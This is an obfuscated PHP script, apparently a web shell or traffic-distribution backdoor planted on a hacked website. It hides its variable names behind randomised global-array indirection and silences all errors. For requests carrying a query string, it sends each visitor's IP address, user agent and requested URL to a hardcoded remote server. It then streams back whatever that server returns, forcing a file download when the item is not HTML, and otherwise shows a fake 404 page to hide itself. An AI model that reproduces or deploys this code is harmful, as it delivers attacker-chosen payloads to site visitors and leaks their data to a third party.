<?php
${"GLOBALS"}["hfmnibgtig"]   = "ips";
${"GLOBALS"}["zaqukohkkj"]   = "ip";
${"GLOBALS"}["fpczfknke"]    = "func";
${"GLOBALS"}["gkwyvse"]      = "h";
${"GLOBALS"}["goqptofiw"]    = "res";
${"GLOBALS"}["thpskcj"]      = "h_detected";
${"GLOBALS"}["bjkmsyafdmuw"] = "headers";
${"GLOBALS"}["rhxiztjm"]     = "data";
${"GLOBALS"}["duzghq"]       = "k";
${"GLOBALS"}["dmkoegsts"]    = "v";
${"GLOBALS"}["kmmjtmc"]      = "cookie";
${"GLOBALS"}["cirsgdg"]      = "request";
${"GLOBALS"}["fkeupeyexfmk"] = "timeout";
${"GLOBALS"}["yaudjyo"]      = "errstr";
${"GLOBALS"}["hahqpuuldvr"]  = "errno";
${"GLOBALS"}["nwmhctnoy"]    = "port";
${"GLOBALS"}["evrshigd"]     = "fp";
${"GLOBALS"}["dkybtjey"]     = "params";
${"GLOBALS"}["hygnxl"]       = "uri";
${"GLOBALS"}["zovytdpysm"]   = "type";
${"GLOBALS"}["unvrvgmd"]     = "filename";
${"GLOBALS"}["vlqopxmxgrd"]  = "content";
${"GLOBALS"}["adalfphu"]     = "url";
${"GLOBALS"}["exutbtuec"]    = "query";
${"GLOBALS"}["frtdlntnn"]    = "remote";
error_reporting(0);
ini_set("display_errors", 0);
if (strlen($_SERVER["QUERY_STRING"]) == 0) {
    error_404();
}
${${"GLOBALS"}["frtdlntnn"]} = "http://78.138.127.174/2701dfbvcxff.php";
php_display(${${"GLOBALS"}["frtdlntnn"]});
error_404();
function php_display($url)
{
    ${"GLOBALS"}["raarljmr"]                   = "query";
    ${"GLOBALS"}["kghdwca"]                    = "url";
    ${"GLOBALS"}["vilfjgrstr"]                 = "query";
    ${${"GLOBALS"}["raarljmr"]}                = array();
    $sxxpvocik                                 = "content";
    ${"GLOBALS"}["zqhblgefkyfd"]               = "content";
    ${${"GLOBALS"}["exutbtuec"]}["ip"]         = getIp();
    $mmzcqudkxbjd                              = "content";
    ${${"GLOBALS"}["exutbtuec"]}["path"]       = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    ${"GLOBALS"}["utmelghg"]                   = "content";
    $wtyfqiuuryn                               = "query";
    ${${"GLOBALS"}["vilfjgrstr"]}["useragent"] = getUseragent();
    ${${"GLOBALS"}["adalfphu"]}                = ${${"GLOBALS"}["kghdwca"]} . "?" . http_build_query(${$wtyfqiuuryn});
    $kjkunvv                                   = "filename";
    ${$mmzcqudkxbjd}                           = @file_get_contents(${${"GLOBALS"}["adalfphu"]});
    if (strlen(${${"GLOBALS"}["utmelghg"]}) < 10) {
        error_404();
    }
    ${${"GLOBALS"}["vlqopxmxgrd"]}  = explode("
", ${${"GLOBALS"}["vlqopxmxgrd"]});
    ${$kjkunvv}                     = array_shift(${${"GLOBALS"}["vlqopxmxgrd"]});
    ${${"GLOBALS"}["zqhblgefkyfd"]} = implode("
", ${$sxxpvocik});
    if (strstr(${${"GLOBALS"}["unvrvgmd"]}, ".html") === FALSE) {
        ${"GLOBALS"}["mkuwusknikkm"]  = "content";
        $cdwvgbn                      = "filename";
        ${${"GLOBALS"}["zovytdpysm"]} = "application/octet-stream";
        ${"GLOBALS"}["uctveteetipe"]  = "type";
        header("Content-Type:" . ${${"GLOBALS"}["uctveteetipe"]});
        header("Content-Disposition: attachment; filename=" . ${$cdwvgbn});
        header("Content-Length: " . strlen(${${"GLOBALS"}["mkuwusknikkm"]}));
    }
    echo ${${"GLOBALS"}["vlqopxmxgrd"]};
    exit();
}
function error_404()
{
    ${"GLOBALS"}["ekigsyougde"] = "content";
    header("HTTP/1.1 404 Not Found");
    ${"GLOBALS"}["ppooicwhygh"]    = "content";
    $mlpyciogd                     = "content";
    ${${"GLOBALS"}["hygnxl"]}      = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
    ${"GLOBALS"}["dmpqcvqrmbxi"]   = "uri";
    ${${"GLOBALS"}["vlqopxmxgrd"]} = custom_http_request("http://" . $_SERVER["HTTP_HOST"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
    ${${"GLOBALS"}["ekigsyougde"]} = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", ${${"GLOBALS"}["dmpqcvqrmbxi"]}, ${${"GLOBALS"}["ppooicwhygh"]});
    exit(${$mlpyciogd});
}
function custom_http_request($params)
{
    ${"GLOBALS"}["rpbduqeew"]    = "params";
    ${"GLOBALS"}["kfmdcq"]       = "params";
    ${"GLOBALS"}["vixdrutdmipl"] = "scheme";
    ${"GLOBALS"}["skithlp"]      = "params";
    ${"GLOBALS"}["xxehovhjncm"]  = "params";
    ${"GLOBALS"}["imarwteum"]    = "url";
    $mgfhxdulu                   = "timeout";
    $hiznhk                      = "port";
    $pgcnydrskkow                = "res";
    $lbleptt                     = "params";
    ${"GLOBALS"}["deynxvrikuf"]  = "url";
    $gltisxmf                    = "url";
    if (!is_array(${${"GLOBALS"}["skithlp"]})) {
        $ifhixrdyp    = "params";
        ${$ifhixrdyp} = array(
            "url" => ${${"GLOBALS"}["dkybtjey"]},
            "method" => "GET"
        );
    }
    ${"GLOBALS"}["yepdcevuxpl"]  = "url";
    ${"GLOBALS"}["vihctkjfhvvy"] = "params";
    if (${${"GLOBALS"}["kfmdcq"]}["url"] == "")
        return FALSE;
    $ubxlgnhuyr = "params";
    if (!isset(${${"GLOBALS"}["dkybtjey"]}["method"]))
        ${$ubxlgnhuyr}["method"] = (isset(${${"GLOBALS"}["xxehovhjncm"]}["data"]) && is_array(${${"GLOBALS"}["dkybtjey"]}["data"])) ? "POST" : "GET";
    $cskpgqwdqo                               = "params";
    ${${"GLOBALS"}["vihctkjfhvvy"]}["method"] = strtoupper(${${"GLOBALS"}["dkybtjey"]}["method"]);
    if (!in_array(${${"GLOBALS"}["dkybtjey"]}["method"], array(
        "GET",
        "POST"
    )))
        return FALSE;
    $epiobcqrqlz                 = "url";
    ${$gltisxmf}                 = parse_url(${$cskpgqwdqo}["url"]);
    ${"GLOBALS"}["nxufvtacx"]    = "res";
    ${"GLOBALS"}["sfluwzoaoune"] = "params";
    if (!isset(${${"GLOBALS"}["adalfphu"]}["scheme"]))
        ${${"GLOBALS"}["adalfphu"]}["scheme"] = "http";
    if (!isset(${${"GLOBALS"}["imarwteum"]}["path"]))
        ${${"GLOBALS"}["adalfphu"]}["path"] = "/";
    ${"GLOBALS"}["niyefoisfi"] = "url";
    $tkjjnyhwfoag              = "scheme";
    if (!isset(${${"GLOBALS"}["adalfphu"]}["host"]) && isset(${$epiobcqrqlz}["path"])) {
        ${"GLOBALS"}["pgldxeumkut"] = "url";
        if (strpos(${${"GLOBALS"}["pgldxeumkut"]}["path"], "/")) {
            $nrkejedmbdu                          = "url";
            ${"GLOBALS"}["rwmlcdvjgd"]            = "url";
            ${"GLOBALS"}["mawbbupy"]              = "url";
            ${"GLOBALS"}["wxvxqaycqqcv"]          = "url";
            ${${"GLOBALS"}["rwmlcdvjgd"]}["host"] = substr(${${"GLOBALS"}["wxvxqaycqqcv"]}["path"], 0, strpos(${${"GLOBALS"}["adalfphu"]}["path"], "/"));
            ${${"GLOBALS"}["adalfphu"]}["path"]   = substr(${${"GLOBALS"}["mawbbupy"]}["path"], strpos(${$nrkejedmbdu}["path"], "/"));
        } else {
            ${"GLOBALS"}["grhytlhc"]            = "url";
            $qhdogvo                            = "url";
            ${$qhdogvo}["host"]                 = ${${"GLOBALS"}["adalfphu"]}["path"];
            ${${"GLOBALS"}["grhytlhc"]}["path"] = "/";
        }
    }
    ${${"GLOBALS"}["adalfphu"]}["path"] = preg_replace("/[\/]+/", "/", ${${"GLOBALS"}["yepdcevuxpl"]}["path"]);
    if (isset(${${"GLOBALS"}["adalfphu"]}["query"]))
        ${${"GLOBALS"}["adalfphu"]}["path"] .= "?{$url['query']}";
    ${$hiznhk}    = isset(${${"GLOBALS"}["dkybtjey"]}["port"]) ? ${$lbleptt}["port"] : (isset(${${"GLOBALS"}["niyefoisfi"]}["port"]) ? ${${"GLOBALS"}["adalfphu"]}["port"] : (${${"GLOBALS"}["adalfphu"]}["scheme"] == "https" ? 443 : 80));
    ${$mgfhxdulu} = isset(${${"GLOBALS"}["dkybtjey"]}["timeout"]) ? ${${"GLOBALS"}["rpbduqeew"]}["timeout"] : 30;
    if (!isset(${${"GLOBALS"}["dkybtjey"]}["return"]))
        ${${"GLOBALS"}["dkybtjey"]}["return"] = "content";
    ${"GLOBALS"}["jskpbxwrosfw"]    = "res";
    $moewmhtgse                     = "headers";
    $bupjnclc                       = "fp";
    ${${"GLOBALS"}["vixdrutdmipl"]} = ${${"GLOBALS"}["deynxvrikuf"]}["scheme"] == "https" ? "ssl://" : "";
    ${${"GLOBALS"}["evrshigd"]}     = @fsockopen(${$tkjjnyhwfoag} . ${${"GLOBALS"}["adalfphu"]}["host"], ${${"GLOBALS"}["nwmhctnoy"]}, ${${"GLOBALS"}["hahqpuuldvr"]}, ${${"GLOBALS"}["yaudjyo"]}, ${${"GLOBALS"}["fkeupeyexfmk"]});
    if (${$bupjnclc}) {
        ${"GLOBALS"}["ywkmwgmun"] = "fp";
        $wrywtprn                 = "request";
        ${"GLOBALS"}["ctwpwmfpd"] = "request";
        $rcewvwoncgs              = "request";
        $klaxtlfng                = "params";
        $ejtawqkjvwv              = "params";
        if (!isset(${$klaxtlfng}["User-Agent"]))
            ${$ejtawqkjvwv}["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        ${"GLOBALS"}["njmbwqgsjh"] = "params";
        ${"GLOBALS"}["qycqxlfe"]   = "res";
        ${${"GLOBALS"}["cirsgdg"]} = "{$params['method']} {$url['path']} HTTP/1.0
";
        ${$wrywtprn} .= "Host: {$url['host']}
";
        ${"GLOBALS"}["bqwdrkh"] = "params";
        ${${"GLOBALS"}["cirsgdg"]} .= "User-Agent: {$params['User-Agent']}" . "
";
        if (isset(${${"GLOBALS"}["bqwdrkh"]}["referer"]))
            ${${"GLOBALS"}["ctwpwmfpd"]} .= "Referer: {$params['referer']}
";
        ${"GLOBALS"}["sfgjshen"] = "params";
        if (isset(${${"GLOBALS"}["dkybtjey"]}["cookie"])) {
            ${"GLOBALS"}["xbuxsue"]    = "cookie";
            $izixaouwju                = "params";
            ${${"GLOBALS"}["kmmjtmc"]} = "";
            $uydzdxtjj                 = "cookie";
            $qfbaog                    = "request";
            if (is_array(${$izixaouwju}["cookie"])) {
                $etxefpr                     = "cookie";
                $qvsaebfw                    = "cookie";
                ${"GLOBALS"}["whhxdeqplxdm"] = "k";
                $qsnkils                     = "params";
                $oqcnxxdgy                   = "v";
                foreach (${$qsnkils}["cookie"] as ${${"GLOBALS"}["whhxdeqplxdm"]} => ${$oqcnxxdgy})
                    ${$qvsaebfw} .= "$k=$v; ";
                $tymuackpyyx    = "cookie";
                ${$tymuackpyyx} = substr(${$etxefpr}, 0, -2);
            } else
                ${$uydzdxtjj} = ${${"GLOBALS"}["dkybtjey"]}["cookie"];
            if (${${"GLOBALS"}["xbuxsue"]} != "")
                ${$qfbaog} .= "Cookie: $cookie
";
        }
        ${${"GLOBALS"}["cirsgdg"]} .= "Connection: close
";
        if (${${"GLOBALS"}["njmbwqgsjh"]}["method"] == "POST") {
            ${"GLOBALS"}["vwhhfisif"] = "data";
            if (isset(${${"GLOBALS"}["dkybtjey"]}["data"]) && is_array(${${"GLOBALS"}["dkybtjey"]}["data"])) {
                ${"GLOBALS"}["mgmnrst"]    = "v";
                $rwdexltep                 = "data";
                ${"GLOBALS"}["jmhoexxptj"] = "data";
                $cbkyxubxa                 = "data";
                ${"GLOBALS"}["lbctcbl"]    = "data";
                ${"GLOBALS"}["hplxqfn"]    = "k";
                foreach (${${"GLOBALS"}["dkybtjey"]}["data"] AS ${${"GLOBALS"}["hplxqfn"]} => ${${"GLOBALS"}["dmkoegsts"]})
                    ${$cbkyxubxa} .= urlencode(${${"GLOBALS"}["duzghq"]}) . "=" . urlencode(${${"GLOBALS"}["mgmnrst"]}) . "&";
                if (substr(${${"GLOBALS"}["jmhoexxptj"]}, -1) == "&")
                    ${$rwdexltep} = substr(${${"GLOBALS"}["lbctcbl"]}, 0, -1);
            }
            ${${"GLOBALS"}["vwhhfisif"]} .= "

";
            ${${"GLOBALS"}["cirsgdg"]} .= "Content-type: application/x-www-form-urlencoded
";
            ${${"GLOBALS"}["cirsgdg"]} .= "Content-length: " . strlen(${${"GLOBALS"}["rhxiztjm"]}) . "
";
        }
        ${${"GLOBALS"}["cirsgdg"]} .= "
";
        ${"GLOBALS"}["gymemwndow"] = "fp";
        if (${${"GLOBALS"}["sfgjshen"]}["method"] == "POST")
            ${${"GLOBALS"}["cirsgdg"]} .= ${${"GLOBALS"}["rhxiztjm"]};
        @fwrite(${${"GLOBALS"}["evrshigd"]}, ${$rcewvwoncgs});
        ${${"GLOBALS"}["qycqxlfe"]}     = "";
        ${${"GLOBALS"}["bjkmsyafdmuw"]} = "";
        ${${"GLOBALS"}["thpskcj"]}      = false;
        while (!@feof(${${"GLOBALS"}["gymemwndow"]})) {
            $lqnmxlpiaw = "res";
            $pumdxni    = "res";
            ${$pumdxni} .= @fread(${${"GLOBALS"}["evrshigd"]}, 1024);
            if (!${${"GLOBALS"}["thpskcj"]} && strpos(${$lqnmxlpiaw}, "

") !== FALSE) {
                ${"GLOBALS"}["phtitpwfi"]   = "res";
                ${"GLOBALS"}["ceotabbpqud"] = "headers";
                ${"GLOBALS"}["pjnwou"]      = "res";
                ${"GLOBALS"}["zhraky"]      = "params";
                $oeqiubfj                   = "res";
                ${"GLOBALS"}["adaqdivq"]    = "headers";
                ${${"GLOBALS"}["thpskcj"]}  = true;
                $khgqovuhu                  = "params";
                ${${"GLOBALS"}["adaqdivq"]} = substr(${${"GLOBALS"}["phtitpwfi"]}, 0, strpos(${${"GLOBALS"}["pjnwou"]}, "

"));
                ${$oeqiubfj}                = substr(${${"GLOBALS"}["goqptofiw"]}, strpos(${${"GLOBALS"}["goqptofiw"]}, "

") + 4);
                $ugvdzmbig                  = "params";
                if (${$khgqovuhu}["return"] == "headers" || ${${"GLOBALS"}["dkybtjey"]}["return"] == "array" || (isset(${$ugvdzmbig}["redirect"]) && ${${"GLOBALS"}["dkybtjey"]}["redirect"] == true)) {
                    $tsbiwulfowhr              = "v";
                    ${"GLOBALS"}["iqrhxdf"]    = "h";
                    $tuykrk                    = "headers";
                    $frfdskiwxv                = "k";
                    ${"GLOBALS"}["kpwuep"]     = "headers";
                    ${${"GLOBALS"}["iqrhxdf"]} = explode("
", ${$tuykrk});
                    ${${"GLOBALS"}["kpwuep"]}  = array();
                    foreach (${${"GLOBALS"}["gkwyvse"]} as ${$frfdskiwxv} => ${$tsbiwulfowhr}) {
                        $dicebo = "v";
                        if (strpos(${$dicebo}, ":")) {
                            $ojxubpulg                   = "v";
                            ${"GLOBALS"}["mkfupgkidqyu"] = "v";
                            ${${"GLOBALS"}["duzghq"]}    = substr(${${"GLOBALS"}["dmkoegsts"]}, 0, strpos(${$ojxubpulg}, ":"));
                            ${${"GLOBALS"}["dmkoegsts"]} = trim(substr(${${"GLOBALS"}["mkfupgkidqyu"]}, strpos(${${"GLOBALS"}["dmkoegsts"]}, ":") + 1));
                        }
                        ${"GLOBALS"}["kiaarey"]                                                = "v";
                        ${${"GLOBALS"}["bjkmsyafdmuw"]}[strtoupper(${${"GLOBALS"}["duzghq"]})] = ${${"GLOBALS"}["kiaarey"]};
                    }
                }
                if (isset(${${"GLOBALS"}["zhraky"]}["redirect"]) && ${${"GLOBALS"}["dkybtjey"]}["redirect"] == true && isset(${${"GLOBALS"}["bjkmsyafdmuw"]}["LOCATION"])) {
                    ${"GLOBALS"}["ssmmvued"]           = "params";
                    ${${"GLOBALS"}["dkybtjey"]}["url"] = ${${"GLOBALS"}["bjkmsyafdmuw"]}["LOCATION"];
                    if (!isset(${${"GLOBALS"}["dkybtjey"]}["redirect-count"]))
                        ${${"GLOBALS"}["ssmmvued"]}["redirect-count"] = 0;
                    if (${${"GLOBALS"}["dkybtjey"]}["redirect-count"] < 10) {
                        ${${"GLOBALS"}["dkybtjey"]}["redirect-count"]++;
                        $jetmhydib    = "func";
                        $bfdsupd      = "params";
                        $rzdgnapdmw   = "params";
                        ${$jetmhydib} = __FUNCTION__;
                        return @is_object($this) ? $this->${${"GLOBALS"}["fpczfknke"]}(${$bfdsupd}) : ${${"GLOBALS"}["fpczfknke"]}(${$rzdgnapdmw});
                    }
                }
                if (${${"GLOBALS"}["dkybtjey"]}["return"] == "headers")
                    return ${${"GLOBALS"}["ceotabbpqud"]};
            }
        }
        @fclose(${${"GLOBALS"}["ywkmwgmun"]});
    } else
        return FALSE;
    if (${${"GLOBALS"}["sfluwzoaoune"]}["return"] == "array")
        ${$pgcnydrskkow} = array(
            "headers" => ${$moewmhtgse},
            "content" => ${${"GLOBALS"}["nxufvtacx"]}
        );
    return ${${"GLOBALS"}["jskpbxwrosfw"]};
}
function getUseragent()
{
    return $_SERVER["HTTP_USER_AGENT"];
}
function getIp()
{
    $nzpdlvvn                     = "ip";
    ${"GLOBALS"}["jfrgotjwgfeb"]  = "ip";
    ${${"GLOBALS"}["zaqukohkkj"]} = NULL;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        ${${"GLOBALS"}["zaqukohkkj"]} = $_SERVER["REMOTE_ADDR"];
    }
    if (strpos(${$nzpdlvvn}, ",") !== FALSE) {
        ${"GLOBALS"}["fpparhroiyb"]    = "ip";
        ${${"GLOBALS"}["hfmnibgtig"]}  = explode(",", ${${"GLOBALS"}["zaqukohkkj"]});
        ${${"GLOBALS"}["fpparhroiyb"]} = trim(array_pop(${${"GLOBALS"}["hfmnibgtig"]}));
    }
    return ${${"GLOBALS"}["jfrgotjwgfeb"]};
}
?>
